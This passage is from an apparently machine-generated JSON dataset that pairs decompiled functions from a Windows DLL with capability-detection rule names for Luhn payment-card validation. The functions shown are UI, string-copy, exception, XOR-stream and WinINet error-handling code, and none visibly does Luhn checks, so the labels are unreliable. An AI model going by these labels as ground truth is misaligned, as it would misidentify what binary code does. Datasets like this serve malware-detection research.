        "decompiled_code": "\nvoid fcn.180062700(int64_t arg1)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    char in_DL;\n    char16_t *pcVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    uchar auStack56 [32];\n    int32_t aiStack24 [2];\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack56;\n    pcVar4 = 0x1800fd000;\n    if (in_DL != '\\0') {\n        pcVar4 = L\"Re-Apply\";\n    }\n    uVar2 = (**0x1800de798)(*(arg1 + 0x18), 0x2379);\n    (**0x1800de778)(uVar2, pcVar4);\n    uVar2 = (**0x1800de798)(*(arg1 + 0x18), 0x237a);\n    (**0x1800de770)(uVar2, in_DL);\n    if (in_DL != '\\0') {\n        aiStack24[0] = -1;\n        (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, aiStack24);\n        if (-1 < aiStack24[0]) {\n            iVar5 = *0x18012a398;\n            if (aiStack24[0] != 0) {\n                iVar5 = *0x18012a3a0;\n            }\n            if (iVar5 != 0) {\n                (**0x1800de7f0)(iVar5, 0x8c0, 2);\n                (**0x1800de7f0)(iVar5, 0x8c4, 2, 0xfe000000);\n                (**0x1800de7f0)(iVar5, 0x8c6, 2);\n                iVar3 = (**0x1800de7c0)(0);\n                if (iVar3 == 0) {\n                    iVar6 = 0;\n                }\n                else {\n                    uVar1 = (**0x1800de0d0)(iVar3, 0x58);\n                    iVar6 = (**0x1800de440)(0xe, uVar1, 0x60);\n                    (**0x1800de5a8)(0, iVar3);\n                }\n                (**0x1800de7f0)(iVar5, 0x8c2, 2, iVar6);\n                (**0x1800de7f0)(iVar5, 0x8b9, 0x14);\n                iVar6 = (**0x1800de7f0)(iVar5, 0x9e1, 0x1f);\n                if (iVar6 < 6) {\n                    (**0x1800de7f0)(iVar5, 0x7f8, 0x1f);\n                    (**0x1800de7f0)(iVar5, 0x7f8, 0x1e);\n                    (**0x1800de7f0)(iVar5, 0x7f8, 0x1d);\n                    (**0x1800de7f0)(iVar5, 0x7f8, 0x1c);\n                    (**0x1800de7f0)(iVar5, 0x7f8, 0x1b);\n                    (**0x1800de7f0)(iVar5, 0x7f8, 0x1a);\n                    (**0x1800de7f0)(iVar5, 0x7f8, 0x19);\n                }\n            }\n        }\n    }\n    fcn.18008fb00(uStack16 ^ auStack56);\n    return;\n}\n",
        "token_count": 836
    },
    "180062bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180062bc0(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uchar auStack72 [32];\n    int32_t aiStack40 [2];\n    uint64_t uStack32;\n    \n    if (-1 < arg3) {\n        uStack32 = *0x180123080 ^ auStack72;\n        aiStack40[0] = -1;\n        (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, aiStack40);\n        if (-1 < aiStack40[0]) {\n            iVar6 = *0x18012a398;\n            if (aiStack40[0] != 0) {\n                iVar6 = *0x18012a3a0;\n            }\n            if (iVar6 != 0) {\n                uVar2 = (**0x1800de748)(0, 0x7f02);\n                (**0x1800de750)(uVar2);\n                uVar3 = (**0x1800de7f0)(iVar6, 0x86a, 0, 0);\n                uVar5 = 0;\n                if (uVar3 != 0) {\n                    do {\n                        uVar1 = (**0x1800de7f0)(iVar6, 0x8af, uVar5, 0);\n                        if (((uVar1 >> 0xd & 1) != 0) &&\n                           (((0xfe < arg3 || (arg3 == (uVar1 - 0x400 & 0xfff))) &&\n                            (iVar4 = (**0x1800de7f0)(iVar6, 0x8b6, uVar5),  (iVar4 != 0) != noname_1)))) {\n                            (**0x1800de7f0)(iVar6, 0x8b7, uVar5);\n                        }\n                        uVar5 = uVar5 + 1;\n                    } while (uVar5 < uVar3);\n                }\n                uVar2 = (**0x1800de748)(0, 0x7f00);\n                (**0x1800de750)(uVar2);\n                fcn.18005b920(arg1);\n            }\n        }\n        fcn.18008fb00(uStack32 ^ auStack72);\n    }\n    return;\n}\n",
        "token_count": 560
    },
    "18006390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180063900(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    fcn.18000da90(arg2, arg3);\n    fcn.18000de50(arg2 + 0x20, arg3 + 0x20);\n    fcn.18000de50(arg2 + 0x40, arg3 + 0x40);\n    fcn.18000de50(arg2 + 0x60, arg3 + 0x60);\n    *(arg2 + 0x80) = *(arg3 + 0x80);\n    return;\n}\n",
        "token_count": 136
    },
    "180064f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint * fcn.180064f70(uint *arg1, uint *arg2)\n\n{\n    ulong *arg1_00;\n    ulong *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    *(arg1 + 4) = 0;\n    *(arg1 + 6) = 0;\n    uVar2 = arg2[1];\n    uVar3 = arg2[2];\n    uVar4 = arg2[3];\n    *arg1 = *arg2;\n    arg1[1] = uVar2;\n    arg1[2] = uVar3;\n    arg1[3] = uVar4;\n    uVar2 = arg2[5];\n    uVar3 = arg2[6];\n    uVar4 = arg2[7];\n    arg1[4] = arg2[4];\n    arg1[5] = uVar2;\n    arg1[6] = uVar3;\n    arg1[7] = uVar4;\n    *(arg2 + 4) = 0;\n    *(arg2 + 6) = 7;\n    *arg2 = 0;\n    *(arg1 + 0xc) = 0;\n    *(arg1 + 0xe) = 0;\n    uVar2 = arg2[9];\n    uVar3 = arg2[10];\n    uVar4 = arg2[0xb];\n    arg1[8] = arg2[8];\n    arg1[9] = uVar2;\n    arg1[10] = uVar3;\n    arg1[0xb] = uVar4;\n    uVar2 = arg2[0xd];\n    uVar3 = arg2[0xe];\n    uVar4 = arg2[0xf];\n    arg1[0xc] = arg2[0xc];\n    arg1[0xd] = uVar2;\n    arg1[0xe] = uVar3;\n    arg1[0xf] = uVar4;\n    *(arg2 + 0xc) = 0;\n    *(arg2 + 0xe) = 0xf;\n    *(arg2 + 8) = 0;\n    arg1_00 = arg1 + 0x10;\n    *arg1_00 = 0;\n    fcn.18002ddc0(arg1 + 0x12);\n    puVar1 = arg2 + 0x10;\n    if (arg1_00 != puVar1) {\n        fcn.18002e090(arg1_00);\n        *arg1_00 = *puVar1;\n        *puVar1 = 0;\n    }\n    *(arg1 + 0x1e) = 0;\n    *(arg1 + 0x20) = 0;\n    uVar2 = arg2[0x1b];\n    uVar3 = arg2[0x1c];\n    uVar4 = arg2[0x1d];\n    arg1[0x1a] = arg2[0x1a];\n    arg1[0x1b] = uVar2;\n    arg1[0x1c] = uVar3;\n    arg1[0x1d] = uVar4;\n    uVar2 = arg2[0x1f];\n    uVar3 = arg2[0x20];\n    uVar4 = arg2[0x21];\n    arg1[0x1e] = arg2[0x1e];\n    arg1[0x1f] = uVar2;\n    arg1[0x20] = uVar3;\n    arg1[0x21] = uVar4;\n    *(arg2 + 0x1e) = 0;\n    *(arg2 + 0x20) = 7;\n    *(arg2 + 0x1a) = 0;\n    *(arg1 + 0x22) = 0;\n    *(arg1 + 0x24) = 0;\n    *(arg1 + 0x26) = 0;\n    *(arg1 + 0x22) = *(arg2 + 0x22);\n    *(arg1 + 0x24) = *(arg2 + 0x24);\n    *(arg1 + 0x26) = *(arg2 + 0x26);\n    *(arg2 + 0x22) = 0;\n    *(arg2 + 0x24) = 0;\n    *(arg2 + 0x26) = 0;\n    *(arg1 + 0x28) = 0;\n    *(arg1 + 0x2a) = 0;\n    *(arg1 + 0x2c) = 0;\n    *(arg1 + 0x28) = *(arg2 + 0x28);\n    *(arg1 + 0x2a) = *(arg2 + 0x2a);\n    *(arg1 + 0x2c) = *(arg2 + 0x2c);\n    *(arg2 + 0x28) = 0;\n    *(arg2 + 0x2a) = 0;\n    *(arg2 + 0x2c) = 0;\n    *(arg1 + 0x2e) = 0;\n    *(arg1 + 0x30) = 0;\n    *(arg1 + 0x32) = 0;\n    *(arg1 + 0x2e) = *(arg2 + 0x2e);\n    *(arg1 + 0x30) = *(arg2 + 0x30);\n    *(arg1 + 0x32) = *(arg2 + 0x32);\n    *(arg2 + 0x2e) = 0;\n    *(arg2 + 0x30) = 0;\n    *(arg2 + 0x32) = 0;\n    *(arg1 + 0x34) = 0;\n    *(arg1 + 0x36) = 0;\n    *(arg1 + 0x38) = 0;\n    *(arg1 + 0x34) = *(arg2 + 0x34);\n    *(arg1 + 0x36) = *(arg2 + 0x36);\n    *(arg1 + 0x38) = *(arg2 + 0x38);\n    *(arg2 + 0x34) = 0;\n    *(arg2 + 0x36) = 0;\n    *(arg2 + 0x38) = 0;\n    return arg1;\n}\n",
        "token_count": 1447
    },
    "180066b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180066b30(int64_t arg1, ulong arg2, ulong noname_2, ulong noname_3, ulong noname_4, ulong noname_5, \n                  ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                  ulong noname_12, ulong noname_13, ulong arg_20h)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    \n    puVar2 = arg1 + 8;\n    *(arg1 + 0x468) = arg1 + 0x448;\n    *(arg1 + 0x400) = 0;\n    iVar1 = 0x20;\n    do {\n        puVar2[-1] = 0;\n        *puVar2 = 0;\n        puVar2[1] = 0;\n        puVar2[2] = 0;\n        puVar2 = puVar2 + 4;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *(arg1 + 0x404) = 0;\n    *(arg1 + 0x408) = 0;\n    *(arg1 + 0x410) = 0;\n    *(arg1 + 0x418) = 0;\n    *(arg1 + 0x420) = 0;\n    *(arg1 + 0x428) = 0;\n    *(arg1 + 0x430) = 0;\n    *(arg1 + 0x438) = 0;\n    *(arg1 + 0x440) = 0;\n    fcn.180066660(arg2, noname_2 * 8 + (noname_2 * 8 >> 0x1f & 0xffU) >> 8, arg1, arg1 + 0x404);\n    fcn.180066100(0, 0, 0x20, arg1);\n    fcn.180066100(0, arg1 + 0x448, 1, arg1);\n    *(arg1 + 0x470) = 0;\n    return;\n}\n",
        "token_count": 489
    },
    "180066c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180066c40(int64_t arg1, uint8_t *arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    if (0 < arg3) {\n        iVar1 = *(arg1 + 0x470);\n        iVar2 = arg3;\n        do {\n            if (iVar1 == 0x20) {\n                fcn.180066100(0, arg1 + 0x448, 1, arg1);\n                iVar1 = 0;\n                *(arg1 + 0x470) = 0;\n            }\n            *arg2 = *arg2 ^ *(iVar1 + *(arg1 + 0x468));\n            arg2 = arg2 + 1;\n            *(arg1 + 0x470) = *(arg1 + 0x470) + 1;\n            iVar1 = *(arg1 + 0x470);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 228
    },
    "18006952": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint32_t fcn.180069520(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint64_t *puVar2;\n    \n    puVar2 = fcn.180020a80();\n    iVar1 = fcn.1800b6240(*puVar2 | 1, arg1, 0xffffffffffffffff, arg2);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 114
    },
    "1800696f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800696f0(void)\n\n{\n    uint16_t uVar1;\n    int64_t iVar2;\n    uchar auStack56 [32];\n    uint uStack24;\n    uint32_t uStack20;\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack56;\n    uStack24 = 0x100;\n    if (*0x18012b098 == NULL) {\n        iVar2 = (**0x1800de138)(0x1800fdb88);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b098 = (**0x1800de458)(iVar2, \"InternetGetLastResponseInfoA\");\n    }\n    uVar1 = (**0x1800de400)();\n    uStack20 = uVar1;\n    // switch table (69 cases) at 0x180069ee0\n    switch(uVar1) {\n    case 0x2ee1:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ee2:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ee3:\n        if (*0x18012b098 != NULL) {\n            (**0x18012b098)(&uStack20, \"Unknown internet error 0x00000000\", &uStack24);\n            goto code_r0x000180069ec5;\n        }\n        break;\n    case 0x2ee4:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ee5:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ee6:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ee7:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ee8:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ee9:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2eea:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2eeb:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2eec:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2eed:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2eee:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2eef:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ef0:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ef1:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ef2:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ef3:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ef4:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ef5:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ef6:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ef7:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ef8:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2ef9:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2efa:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2efb:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2efc:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2efd:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2efe:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2eff:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f00:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f01:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f04:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f05:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f06:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f07:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f08:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f09:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f0a:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f0b:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f0c:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f17:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f18:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f19:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f4e:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f4f:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f62:\n    case 0x2f63:\n    case 0x2f64:\n    case 0x2f65:\n    case 0x2f66:\n    case 0x2f67:\n    case 0x2f68:\n    case 0x2f69:\n    case 0x2f6a:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f76:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f77:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f78:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f79:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f7a:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f7b:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f7c:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f7d:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f7e:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f7f:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f83:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f84:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f85:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f86:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f87:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f89:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f8b:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f8c:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f8d:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    case 0x2f8e:\n        fcn.18008fb00(uStack16 ^ auStack56);\n        return;\n    }\n    fcn.1800695e0(\"Unknown internet error 0x00000000\", 0x100, \"Unknown internet error 0x%08lX\", uVar1);\n    *0x18012b1ef = 0;\ncode_r0x000180069ec5:\n    fcn.18008fb00(uStack16 ^ auStack56);\n    return;\n}\n",
        "token_count": 2395
    },
    "1800753f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.1800753f4(uint64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    \n    if (*0x1801287b8 == 0) {\n        LOCK();\n        uVar2 = *arg1;\n        *arg1 = *arg1 ^ (uVar2 == 0) * (*arg1 ^ 1);\n        uVar4 = 2;\n        iVar3 = (uVar2 != 0) * *arg1;\n        while (iVar3 != 2) {\n            if (iVar3 == 0) {\n                iVar1 = (**0x1800de8f0)(arg1, arg3, arg4);\n                if (iVar1 == 0) {\n                    uVar4 = 0;\n                }\n                uVar2 = *arg1;\n                *arg1 = uVar4;\n                if (uVar2 == 1) {\n                    return iVar1 != 0;\n                }\ncode_r0x0001800754aa:\n                (**0x1800de110)(0xd);\n                return 0;\n            }\n            if (iVar3 != 1) goto code_r0x0001800754aa;\n            (**0x1800de4d0)();\n            LOCK();\n            uVar2 = *arg1;\n            *arg1 = *arg1 ^ (uVar2 == 0) * (*arg1 ^ 1);\n            iVar3 = (uVar2 != 0) * *arg1;\n        }\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = (**0x1800de8f0)();\n    }\n    return uVar2;\n}\n",
        "token_count": 395
    },
    "18006dbd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.18006dbd4(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.1800adaec(&uStack24, arg1 + 1);\n    *arg1 = vtable.std::invalid_argument.0;\n    return arg1;\n}\n",
        "token_count": 117
    },
    "18006dc5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.18006dc58(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.1800adaec(&uStack24, arg1 + 1);\n    *arg1 = vtable.std::length_error.0;\n    return arg1;\n}\n",
        "token_count": 116
    },
    "18006dd1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.18006dd18(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.1800adaec(&uStack24, arg1 + 1);\n    *arg1 = vtable.std::out_of_range.0;\n    return arg1;\n}\n",
        "token_count": 117
    },
    "18007399": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.180073990(ulong *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    int64_t arg2_00;\n    uint64_t uVar1;\n    code *pcVar2;\n    ulong *puVar3;\n    char in_R9B;\n    \n    uVar1 = arg1[2];\n    if (arg2 <= uVar1) {\n        if (arg1[3] - uVar1 < arg3) {\n            arg1 = fcn.18006e254(arg1, arg3, 0, arg2);\n        }\n        else {\n            arg1[2] = uVar1 + arg3;\n            puVar3 = arg1;\n            if (0xf < arg1[3]) {\n                puVar3 = *arg1;\n            }\n            arg2_00 = puVar3 + arg2;\n            fcn.1800ade80(arg2_00 + arg3, arg2_00, (uVar1 - arg2) + 1);\n            fcn.1800ae290(arg2_00, in_R9B, arg3);\n        }\n        return arg1;\n    }\n    fcn.180011cd0();\n    pcVar2 = swi(3);\n    puVar3 = (*pcVar2)();\n    return puVar3;\n}\n",
        "token_count": 290
    },
    "180073ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180073ee4(int64_t arg1)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    ulong in_R9;\n    ulong uVar3;\n    \n    uVar3 = 0xfffffffffffffffe;\n    for (puVar2 = *(arg1 + 0x38); puVar2 != NULL; puVar2 = *puVar2) {\n        (**0x1800de8f0)(0, arg1, *(puVar2 + 1), in_R9, uVar3);\n    }\n    puVar2 = *(arg1 + 0x30);\n    while (puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.18008fb24(puVar2);\n        puVar2 = puVar1;\n    }\n    *(arg1 + 0x30) = 0;\n    puVar2 = *(arg1 + 0x38);\n    while (puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.18008fb24(puVar2);\n        puVar2 = puVar1;\n    }\n    *(arg1 + 0x38) = 0;\n    return;\n}\n",
        "token_count": 268
    },
    "180082bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.180082bd0(ulong *arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    \n    iVar1 = arg1[2];\n    if (arg1[3] - iVar1 < arg3) {\n        arg1 = fcn.1800762ec(arg1, arg3, arg3 & 0xffffffffffffff00, arg2);\n    }\n    else {\n        arg1[2] = iVar1 + arg3;\n        puVar2 = arg1;\n        if (7 < arg1[3]) {\n            puVar2 = *arg1;\n        }\n        fcn.1800ade80(puVar2 + iVar1 * 2, arg2, arg3 * 2);\n        *(puVar2 + (iVar1 + arg3) * 2) = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 201
    },
    "180082c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.180082c4c(ulong *arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ushort *puVar3;\n    ushort in_R8W;\n    ulong *puVar4;\n    \n    iVar2 = arg1[2];\n    if (arg1[3] - iVar2 < arg2) {\n        arg1 = fcn.180076580(arg1, arg2, 0, arg2);\n    }\n    else {\n        iVar1 = iVar2 + arg2;\n        arg1[2] = iVar1;\n        puVar4 = arg1;\n        if (7 < arg1[3]) {\n            puVar4 = *arg1;\n        }\n        puVar3 = puVar4 + iVar2 * 2;\n        if (arg2 != 0) {\n            for (; arg2 != 0; arg2 = arg2 - 1) {\n                *puVar3 = in_R8W;\n                puVar3 = puVar3 + 1;\n            }\n        }\n        *(puVar4 + iVar1 * 2) = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 257
    },
    "1800891d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.1800891dc(ulong *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    ulong *puVar3;\n    ushort *arg2_00;\n    ushort in_R9W;\n    \n    uVar1 = arg1[2];\n    if (uVar1 < arg2) {\n        fcn.180011cd0();\n        pcVar2 = swi(3);\n        puVar3 = (*pcVar2)();\n        return puVar3;\n    }\n    if (arg1[3] - uVar1 < arg3) {\n        arg1 = fcn.180076434(arg1, arg3, 0, arg2);\n    }\n    else {\n        arg1[2] = uVar1 + arg3;\n        puVar3 = arg1;\n        if (7 < arg1[3]) {\n            puVar3 = *arg1;\n        }\n        arg2_00 = puVar3 + arg2 * 2;\n        fcn.1800ade80(arg2_00 + arg3, arg2_00, (uVar1 - arg2) * 2 + 2);\n        if (arg3 != 0) {\n            for (; arg3 != 0; arg3 = arg3 - 1) {\n                *arg2_00 = in_R9W;\n                arg2_00 = arg2_00 + 1;\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 332
    },
    "18008928": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
